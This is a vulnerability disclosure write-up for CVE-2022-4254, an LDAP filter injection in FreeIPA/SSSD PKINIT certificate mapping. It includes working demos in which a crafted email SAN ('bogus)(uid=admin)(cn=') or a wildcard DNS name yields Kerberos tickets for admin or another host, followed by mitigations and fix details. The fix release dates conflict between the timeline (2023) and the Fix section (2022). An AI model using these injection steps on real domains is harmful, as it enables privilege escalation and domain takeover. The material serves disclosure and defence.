---
tags: freeipa, security, certificates
---

# CVE-2022-4254: FreeIPA PKINIT certificate mapping vulnerability

## Executive summary

[FreeIPA][] supports the Kerberos *PKINIT* protocol extension ([RFC
4556][]).  PKINIT enables a client to authenticate to the KDC using
an X.509 certificate and the corresonding private key, rather than a
passphrase or keytab.  FreeIPA uses *mapping rules* to map a
certificate presented during a PKINIT authentication request to the
corresponding principal.  The mapping filter is vulnerable to LDAP
filter injection.  The search result can be influenced by values in
the certificate, which may be attacker controlled.  In the most
extreme case, an attacker could gain control of the `admin` account,
leading to full domain takeover.

[FreeIPA]: https://www.freeipa.org/
[RFC 4556]: https://datatracker.ietf.org/doc/html/rfc4556

FreeIPA is **not vulnerable in its default configuration**.  To
exploit this bug requires:

- PKINIT is used in the environment, with certmap rules that are
  susceptible to LDAP filter injection via data from the client's
  certificate; and
- A client certificate used for PKINIT includes data that result in
  the construction of an LDAP filter with a different meaning than
  the administrator intended.  This is unlikely in general, but some
  use cases present a heightened risk, especially if the CA includes
  (or can be induced to include) client-supplied or
  attacker-controlled attributes in end-entity certificates.

The issue was assigned [CVE-2022-4254][].

[CVE-2022-4254]: https://access.redhat.com/security/cve/CVE-2022-4254


### Affected versions

The problem is in *libsss_certmap*, which is part of [SSSD][].
FreeIPA servers use this library in `ipa_kdb` Kerberos plugin
implementation.

[SSSD]: https://sssd.io/

The issue was introduced in [SSSD 1.15.3][] (when
*libsss_certmap* was introduced) and resolved in
[SSSD 2.3.1][].

[SSSD 1.15.3]: https://sssd.io/release-notes/sssd-1.15.3.html
[SSSD 2.3.1]: https://sssd.io/release-notes/sssd-2.3.1.html

All supported versions of RHEL 7 were affected (the fix was released
on the RHEL 7.9 bugfix stream).  RHEL 8.0 up to 8.3 (inclusive) were
also affected (the fix was released to the still-supported streams).

RHEL 8.4 onwards and RHEL 9 are not affected.  No supported versions
of Fedora are affected.

### Timeline

- **2017-07-25**: *libsss_certmap* was released with [SSSD 1.15.3][].
- **2020-04-28**: SSSD issue [pagure#4180][] / [github#5135][] was
  created, reporting a lack of sanitisation of filter substitutions in
  maprules.
- **2020-07-24**: The sanitisation issue was fixed upstream and [SSSD
  2.3.1][] is released, containing the fix.
- **2022-11-16**: While reviewing a feature involving the use of
  PKINIT, I noticed that some versions of the *libsss_certmap* code
  did not seem to sanitise certificate data used in LDAP filters.  I
  started to investigate.
- **2022-11-17**: I succeed in exploiting the behaviour, and began
  internal discussions with Red Hat's Platform Security
  engineering team.
- **2022-12-01**: I sent my analysis to Red Hat's Product Security
  team.  [CVE-2022-4254][] was reserved for this issue on the same
  day.
- **2023-01-24**: Planned release of fix to RHEL 7.9 `sssd` package,
  in Batch Update 20.  Details of the vulnerability were made public.

[pagure#4180]: https://pagure.io/SSSD/sssd/issue/4180
[github#5135]: https://github.com/SSSD/sssd/issues/5135


## Problem description

FreeIPA supports *certificate mapping rules* for mapping
certificates presented during PKINIT authentication to a Kerberos
principal.  Certmap rules are stored in the LDAP database under
`cn=certmaprules,cn=certmap,{basedn}`.  The `ipa_kdb` plugin uses
*libsss_certmap* to process certmap rules.  An example rule object:

```ldif
dn: cn=certmap1,cn=certmaprules,cn=certmap,dc=ipa,dc=test
cn: certmap1
ipacertmapmaprule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
ipaenabledflag: TRUE
objectClass: ipacertmaprule
objectClass: top
```

The `ipacertmaprule` attribute is a string representation of an LDAP
filter ([RFC 4515][]), with substitution templates in curly braces
(e.g.  `{subject_dn}`).  Template substitution is performed by the
`sss_certmap_get_search_filter` subroutine.  The supported templates
are described in `sss_certmap(5)`.  They include:

- `{cert!base64}` (base64 encoding of whole certificate)
- `{issuer_dn}`
- `{subject_dn}`
- `{subject_rfc822_name}`
- `{subject_dns_name}`

[RFC 4515]: https://datatracker.ietf.org/doc/html/rfc4515

The KDC uses the resulting filter within a bigger search filter that
it uses to match the principal.  The filter includes the requested
principal name from the Kerberos *authentication service request
(`AS_REQ`)*, and the maprule filter.  The complete filter has the
following structure (wrapped for readability):

```
(&
  (|
    (objectClass=krbprincipalaux)
    (objectClass=krbprincipal)
    (objectClass=ipakrbprincipal)
  )
  (|
    (ipaKrbPrincipalAlias=REQUESTED_PRINCIPAL@REQUESTED_REALM)
    (krbPrincipalName:caseIgnoreIA5Match:=REQUESTED_PRINCPAL@REQUESTED_REALM)
  )
  MAPRULE_FILTER_GOES_HERE
)
```

Note that the requested principal is **specified by the client** in
the Kerberos `AS_REQ`.  This value *is properly escaped* where it is
inserted in the filter.  But it is important to note that the client
can specify any principal the maprule filter fragment matches.

### Sanitisation not performed

Some template substitutions are inherently safe, but some use values
from the certificate that could contain characters with special
meaning in LDAP filters.  Of the substitutions listed above, only
`{cert!base64}` is safe.  The others could contain special
characters (and there are still more that I did not list).  Values
that could contain special characters have to be sanitised
(escaped).  Specifically, the following characters must be replaced
with a *hex escape sequence*:

- `NUL` → `\00`
- `(` → `\28`
- `)` → `\29`
- `*` → `\2A`
- `\` → `\5C`

The affected versions of SSSD do not perform this sanitisation.  As
a consequence, the template substitutions can result in invalid
filters (resulting in authentication failure) or filters that match
the wrong principal entry (dangerous).  The next two sections
demonstrate two different exploit scenarios.

::: note

LDAP filter injection has been assigned [CWE-90][] in the *Common
Weakness Enumeration* database.  Conceptually it is very similar to
SQL injection ([CWE-89][]).

:::

[CWE-90]: https://cwe.mitre.org/data/definitions/90.html
[CWE-89]: https://cwe.mitre.org/data/definitions/89.html

## Demo 1: Attacker-supplied `rfc822Name`

We will issue a certificate with an attacker-supplied `rfc822Name`
SAN value to an unprivileged user.  The deployment has a plausible
certmap rule with a structure that can be exploited to obtain a TGT
for an attacker-specified user account, including highly privileged
accounts such as `admin`.

It is a fresh deployment running FreeIPA 4.6 on RHEL 7.9:

```shell
# cat /etc/redhat-release
Red Hat Enterprise Linux Server release 7.9 (Maipo)

# rpm -qa |grep ipa-
ipa-client-4.6.8-5.el7.x86_64
sssd-ipa-1.16.5-10.el7.x86_64
ipa-server-4.6.8-5.el7.x86_64
ipa-common-4.6.8-5.el7.noarch
ipa-client-common-4.6.8-5.el7.noarch
ipa-server-common-4.6.8-5.el7.noarch
```

### Setup

Setup steps establish the user account, certmap rules, certificate
profiles and issuance policies required for the subsequent attack.
I perform these steps using the `admin` account:

```
# klist
Ticket cache: KEYRING:persistent:0:0
Default principal: admin@IPA.TEST

Valid starting     Expires            Service principal
28/11/22 23:00:19  29/11/22 23:00:07  ldap/rhel78-0.ipa.test@IPA.TEST
28/11/22 23:00:09  29/11/22 23:00:07  krbtgt/IPA.TEST@IPA.TEST
```

Create the unprivileged user `alice`.  She will be the subject
principal to whom the certificate will be issued.

```shell
# ipa user-add alice --first Alice --last Able --password
Password: XXXXXXXX
Enter Password again to verify: XXXXXXXX
------------------
Added user "alice"
------------------
...
```

Add a new `mail` attribute to `alice`'s LDAP entry.  This will
enable us to issue a certificate from the internal CA that includes
the value as an `rfc822Name` Subject Alternative Name value.

```shell
# echo > mod.ldif <<EOF
dn: uid=alice,cn=users,cn=accounts,dc=ipa,dc=test
changetype: modify
add: mail
mail: "bogus)(uid=admin)(cn="@ipa.test
EOF

# ldapmodify -Y GSSAPI < mod.ldif
modifying entry "uid=alice,cn=users,cn=accounts,dc=ipa,dc=test"
```

I had to add the new `mail` attribute via `ldapmodify` because the
email validation performed by the IPA API does not admit all valid
local-part values.  But it is in fact a valid email address.

::: note

The default access controls in FreeIPA do not allow non-admins to
modify `mail` attributes, even in their own entry.  But I use this
approach because it is plausible for an organisation to have a
system that allows employees to request a specific mail alias.
Indeed we have such a system at Red Hat, although I don't know if it
would allow such an exotic value.

:::

Next, add a *CA ACL* rule that permits certificate to be issued to
user principals.  For convenience we will use the included
`caIPAserviceCert` profile.  Typical real world user certificate
scenarios would require a dedicated profile.


```shell
# ipa caacl-add users_caIPAserviceCert --usercat=all
-------------------------------------
Added CA ACL "users_caIPAserviceCert"
-------------------------------------
  ACL name: users_caIPAserviceCert
  Enabled: TRUE
  User category: all

# ipa caacl-add-profile users_caIPAserviceCert --certprofile caIPAserviceCert
  ACL name: users_caIPAserviceCert
  Enabled: TRUE
  User category: all
  Profiles: caIPAserviceCert
-------------------------
Number of members added 1
-------------------------
```

Finally add the certmap rule.  It has a two-part *or-list* intended
to match the `rfc822Name` from the certificate to the `mail`
attribute, or else match the certificate subject DN to DN of the
LDAP entry:

```shell
# ipa certmaprule-add certmap1 --maprule \
    "(|(mail={subject_rfc822_name})(entryDN={subject_dn}))"
--------------------------------------------------
Added Certificate Identity Mapping Rule "certmap1"
--------------------------------------------------
  Rule name: certmap1
  Mapping rule: (|(mail={subject_rfc822_name})(entryDN={subject_dn}))
  Enabled: TRUE
```

::: note

The steps performed above are not part of the exploit itself, and
they require administrator privileges to perform.  They are
presented as plausible configurations, the likes of which *may*
exist (or not) in a customer's environment.

:::

### Exploit

`alice` will request a certificate with the suspicious `rfc822Name`
and **acquire a TGT for the `admin` user**.  First obtain a TGT for
`alice` (using password authentication):

```shell
$ kinit alice
Password for alice@IPA.TEST:
```

Create a new keypair and certificate signing request (CSR).  The
config causes the CSR to bear a SAN extension request containting
the malicious `rfc822Name`:

```shell
$ echo > naughty.conf <<EOF
[ req ]
prompt = no
encrypt_key = no
distinguished_name = dn
req_extensions = exts
[ dn ]
commonName = "alice"
[ exts ]
subjectAltName=email:\"bogus)(uid=admin)(cn=\"@ipa.test
EOF

$ openssl req -new -config naughty.conf \
    -keyout naughty.key -out naughty.csr
Generating a 2048 bit RSA private key
..........+++
......................+++
writing new private key to 'naughty.key'
-----
```

Issue the certificate (this is a *self-service* certificate request,
which FreeIPA allows, subject to CA ACLs):

```shell
$ ipa cert-request naughty.csr \
    --principal alice naughty.csr \
    --certificate-out naughty.pem
  Issuing CA: ipa
  Certificate: MIIEPjCC...
  Subject: CN=alice,O=IPA.TEST 202211171708
  Subject email address: "bogus)(uid=admin)(cn="@ipa.test
  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
  Not Before: Tue Nov 29 04:42:58 2022 UTC
  Not After: Fri Nov 29 04:42:58 2024 UTC
  Serial number: 13
  Serial number (hex): 0xD
```

Finally, use the new certificate and key to obtain a TGT **for
`admin`**:

```shell
$ kinit -X X509_user_identity=FILE:naughty.pem,naughty.key admin

$ klist
Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
Default principal: admin@IPA.TEST

Valid starting     Expires            Service principal
28/11/22 23:47:44  29/11/22 23:47:44  krbtgt/IPA.TEST@IPA.TEST
```

The exploit succeeds because the unescaped `rfc822Name` value
results in a filter that matches the `admin` user (formatted for
readability):

```
(&
  (|
    (objectClass=krbprincipalaux)
    (objectClass=krbprincipal)
    (objectClass=ipakrbprincipal)
  )
  (|
    (ipaKrbPrincipalAlias=alice@IPA.TEST)
    (krbPrincipalName:caseIgnoreIA5Match:=alice@IPA.TEST)
  )
  (|
    (mail="bogus)
    (uid=admin)
    (cn="@ipa.test)
    (entrydn=CN=alice,O=IPA.TEST 202211171708)
  )
)
```

## Demo 2: Wildcard DNS name

A wildcard certificate can be used to **obtain a TGT for a different
host principal**.

### Setup

Add a profile for issuing wildcard certificates.  I will skip the
details and instead refer to my [blog post on this topic][].

[blog post on this topic]: https://frasertweedale.github.io/blog-redhat/posts/2017-06-26-freeipa-wildcard-san.html

Add a host called `ipa.test`, a *host group* called `webservers`,
and make `ipa.test` a member of `webservers`:

```host
# ipa host-add ipa.test --force
----------------------
Added host "ipa.test"
----------------------
  Host name: ipa.test
  Principal name: host/ipa.test@IPA.TEST
  Principal alias: host/ipa.test@IPA.TEST
  Password: False
  Keytab: False
  Managed by: ipa.test

# ipa hostgroup-add webservers
----------------------------
Added hostgroup "webservers"
----------------------------
  Host-group: webservers

# ipa hostgroup-add-member webservers --hosts ipa.test
  Host-group: webservers
  Member hosts: ipa.test
-------------------------
Number of members added 1
-------------------------
```

Add a *CA ACL* that allows `webservers` to be issued certificates
via the `wildcard` profile:

```shell
# ipa caacl-add webservers_wildcard
----------------------------------
Added CA ACL "webservers_wildcard"
----------------------------------
  ACL name: webservers_wildcard
  Enabled: TRUE

# ipa caacl-add-host webservers_wildcard --hostgroup webservers
  ACL name: webservers_wildcard
  Enabled: TRUE
  Host Groups: webservers
-------------------------
Number of members added 1
-------------------------

# ipa caacl-add-profile webservers_wildcard --certprofile wildcard
  ACL name: webservers_wildcard
  Enabled: TRUE
  Profiles: wildcard
  Host Groups: webservers
-------------------------
Number of members added 1
-------------------------
```

Finally, add a certmap rule that uses SAN `dNSName` values to locate
the principal:

```shell
# ipa certmaprule-add certmap2 \
    --maprule "(fqdn={subject_dns_name})"
--------------------------------------------------
Added Certificate Identity Mapping Rule "certmap2"
--------------------------------------------------
  Rule name: certmap2
  Mapping rule: (fqdn={subject_dns_name})
  Enabled: TRUE
```

### Exploit

We will issue a wildcard certificate for `ipa.test`, and use it to
obtain a TGT for a different host.  You could use *Certmonger* to
request the certificate, but I will interact directly with FreeIPA
via the `ipa` client program.  The operator is the `host/ipa.test`
principal (I `kinit`ed using the host keytab):

```shell
$ klist
Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
Default principal: host/ipa.test@IPA.TEST

Valid starting     Expires            Service principal
29/11/22 03:52:59  30/11/22 03:52:59  krbtgt/IPA.TEST@IPA.TEST
```

Create a keypair and CSR:

```shell
$ openssl req -new -subj '/CN=ipa.test/' -nodes \
    -keyout server.key -out server.csr
Generating a 2048 bit RSA private key
........................................................+++
.....................................................................................................................+++
writing new private key to 'server.key'
-----
```

Request the certificate, being sure to specify the `wildcard`
profile:

```shell
$ ipa cert-request server.csr \
    --principal host/ipa.test \
    --profile-id wildcard \
    --certificate-out server.pem
  Issuing CA: ipa
  Certificate: MIIENTCC...
  Subject: CN=ipa.test,O=IPA.TEST 202211171708
  Subject DNS name: ipa.test, *.ipa.test
  Issuer: CN=Certificate Authority,O=IPA.TEST 202211171708
  Not Before: Tue Nov 29 09:14:09 2022 UTC
  Not After: Fri Nov 29 09:14:09 2024 UTC
  Serial number: 16
  Serial number (hex): 0x10
```

Finally, use the new certificate and key to obtain a TGT for a
**different host** whose `fqdn` attributes matches the LDAP
substring filter `(fqdn=*.ipa.test)`.  In this example I acquire the
TGT for **`host/rhel78-0.ipa.test`** (one of the FreeIPA servers).

```shell
$ kinit -X X509_user_identity=FILE:server.pem,server.key \
    host/rhel78-0.ipa.test

$ klist
Ticket cache: KEYRING:persistent:1001:krb_ccache_UnnYkF2
Default principal: host/rhel78-0.ipa.test@IPA.TEST

Valid starting     Expires            Service principal
29/11/22 04:15:52  30/11/22 04:15:52  krbtgt/IPA.TEST@IPA.TEST
```

The exploit succeeds because the unescaped wildcard `dNSName` value
results in a ***substring match*** filter (formatted for
readability):

```
(&
  (|
    (objectClass=krbprincipalaux)
    (objectClass=krbprincipal)
    (objectClass=ipakrbprincipal)
  )
  (|
    (ipaKrbPrincipalAlias=host/rhel78-0.ipa.test@IPA.TEST)
    (krbPrincipalName:caseIgnoreIA5Match:=host/rhel78-0.ipa.test@IPA.TEST)
  )
  (fqdn=*.ipa.test)
)
```

The maprule filter matches any principal whose `fqdn` attribute ends
in `.ipa.test`.  This sub-filter could match multiple principle
entries, but the *client-specified* principal name used in the
`krbPrincipalName` and `ipaKrbPricipalAlias` filters select the one
we want.

If there are multiple SAN values of the relevant type, the order is
important.  The *last* value is used in the template substitution.
In my certificate, the last value is `*.ipa.test` so the exploit
succeeds.  If the order was reversed, the exploit would not succeed.
This is an implementation detail of SSSD; it might as well have used
the first value but it just happened to be implemented this way.


## Discussion

These exploits required a confluence of contributing factors to
succeed.  Deployments using PKINIT with exact certificate matching
(the default) are also unaffected.  The vulnerability only arises
when the customer uses certmap rules.  None are defined by default.
Certmap rules (if they exist) are only *potentially* vulnerable;
several other factors have to come together.

The attacker must obtain a valid certificate from a trusted CA for a
key they control.  Except in limited cases (e.g. wildcard DNS names)
the attacker must to be able to influence the attributes on the
certificate.  Only *free-form* string attributes are potentially
problematic.  These include DNS name, email address, SAN DN values,
principle names, and perhaps others.  And there have to be SSSD
certmap rule template substitutions for the targeted attribute(s).

Next, there had to be a certmap rule that substitutes the
problematic value into the LDAP search filter.  All filters that
substitute free-form attributes are susceptible to exploitation.
But in practice, *or-list* filters are *more susceptible* to
exploitation than *and-list* or single-clause filters.  This is
because the attacker has more flexibility in how to make the filter
match the target account.  But as we saw in the wildcard `dNSName`
example, even a single-clause filter fragment could be exploitable.

::: note

The default ACIs allow any authenticated account to read certmap
rule entries.  This may aid attackers in working out the attack
details.

:::

Note that most *free-form* attributes have additional syntax rules
imposed upon them.  For example, a SAN `dNSName` value should look
like a DNS name, and a SAN `rfc822Name` value should be a valid
email address.  But the raw ASN.1 data does not guarantee this.
Even legal values can be problematic (as demonstrated).  But if a
trusted CA can be induced to issue certificates that contain
*arbitrary* data in those free-form attributes, there is an even
greater risk of exploitation.

The use of the internal CA in this attack is incidental.  The
administrator can configure FreeIPA to trust external CAs for
validating client PKINIT certificates.  Any trusted CA can be used
in the attack, if the attacker can cause it to issue certificates
containing problematic values.  Note that the KDC trusts the whole
system trust store, not just the trusted CAs from the FreeIPA CA
trust store.  Certmap rules can be equipped with *matching rules* to
restrict which issuers are allowed for PKINIT certificate matching,
separate from CA trust for certification path verification purposes.


## Mitigations

### Use exact certificate matching / do not use certmap rules

PKINIT uses exact certificate matching by default.  If feasible, you
can rely on that method and disable or delete any certmap rules.
`ipa certmaprule-find` lists all certmap rules that have been
defined.  Use `ipa certmaprule-disable NAME` or `ipa certmaprule-del
NAME` to disable or delete certmap rules, respectively.

The main drawback to this approach is that each principal's entry
must have an up-to-date `userCertificate` attribute containing the
user's certificate(s).  This increases the size of entries, and may
have additional adminstrative overhead depending on how certificates
are issued and managed.

### Audit and de-risk certmap rules

Non-santised parameter substitution in an LDAP filter *or-list* is
riskier than in *and-lists* lists or single .  Replace certmap rules
containing *or* lists with multiple, separate certmap rules.

Ensure each rule is as specific as possible, and consider the
possibility of outlier or malicious values in the certificate when
designing certmap rules.

### Review CA trust, profiles and validation

Review the kinds of data, especially user-supplied or user-writeable
data, that can be included on certificates issued by CAs that are
trusted for PKINIT purposes.  Audit how those data are validated.

Review and limit which CAs are trusted for PKINIT to only those that
are necessary.  If possible, consider using dedicated CAs for
issuing the client certificates used for PKINIT.  Use the certmap
*matching rule* feature (not discussed here) to restrict the KDC to
only allow certificates issued by the PKINIT CAs.


## Fix

Lack of sanitisation in certmap LDAP filter construction was
recognised as a bug in SSSD issue [pagure#4180][] / [github#5135][].
The framing of the issue was that legitimate values in the
certificate were causing SSSD to construct invalid LDAP filters.  It
appears that the security implications were not recognised or
discussed at that time.

SSSD commit [a2b9a84460429181f2a4fa7e2bb5ab49fd561274][commit]
implemented the required sanitisation.  [SSSD 2.3.1][] was the first
release containing the fix.  Commit
[918fb32af6a271230bf87db47f78768edb9ca86c][commit-1.16] on
**2022-01-06** backported the fix to the `sssd-1.16` branch, but
there has not yet been a new release from this branch containing the
fix.

[commit]: https://github.com/SSSD/sssd/commit/a2b9a84460429181f2a4fa7e2bb5ab49fd561274
[commit-1.16]: https://github.com/SSSD/sssd/commit/918fb32af6a271230bf87db47f78768edb9ca86c

The SSSD team backported the fix to RHEL 7.9.  It was included in
Batch Update 20 which was released on **2022-01-24**.  Fixes to
extended support streams for RHEL 8.1 and 8.2 were also released on
that day, meaning that the issue is now fixed in all supported
versions of RHEL.
